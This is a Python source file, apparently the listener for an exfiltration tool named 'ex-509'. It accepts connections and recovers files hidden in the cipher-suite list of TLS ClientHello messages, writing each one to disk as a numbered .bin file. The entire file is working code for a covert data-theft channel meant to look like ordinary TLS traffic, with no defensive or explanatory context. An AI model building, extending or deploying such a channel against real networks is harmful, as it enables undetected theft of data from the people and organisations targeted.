import argparse
import lib.spinner
import os
import signal
import socket
import sys


def parse_args():
	p = argparse.ArgumentParser(description="Data exfiltration via TLS cipher suites")

	p.add_argument(
		"-p",
		"--port",
		type=int,
		default=1337,
		help="port to listen on"
	)

	p.add_argument(
		"-v",
		"--version",
		help="print the program version",
		action="store_true"
	)

	return p.parse_args()


# Keep track of sockets and make sure they're closed before exiting
sock_list = []
def signal_handler(sig, frame):
	print("\n[*] Performing Cleanup")

	for s in sock_list:
		try:
			s.close()
		except Exception:
			pass

	print("[*] Done")
	sys.exit(0)


def handle_args(args):
	if args.version:
		print("ex-509 v1.1\nWritten by Adeem Mawani")
		sys.exit(0)


if __name__ == "__main__":
	signal.signal(signal.SIGINT, signal_handler)
	arg = parse_args()
	handle_args(arg)

	# Listen for client connections
	sock = socket.socket()
	sock.bind(("", arg.port))
	sock.listen()
	sock_list.append(sock)

	file_count = 0

	while True:
		with lib.spinner.Spinner(" Listening on port {}".format(arg.port)):
			client, addr = sock.accept()
			sock_list.append(client)

		print("[*] Client connected: {}:{}".format(addr[0], addr[1]))

		try:
			# Get client hello handshake
			handshake = client.recv(65500)

			# Cipher suite data starts at byte 46
			cipher_len = int.from_bytes(handshake[44:46], "big")
			cipher_data = handshake[46:(cipher_len + 46)]

			print("[*] Received File\n")

			# Output the received file with a sequential name
			path = os.path.join(os.getcwd(), str(file_count) + ".bin")
			with open(path, "wb") as f:
				f.write(cipher_data)

			# Cleanup and repeat
			client.close()
			sock_list.remove(client)
			file_count += 1

		except Exception as e:
			print("[!] {0}".format(e))
			os.kill(os.getpid(), signal.SIGINT)
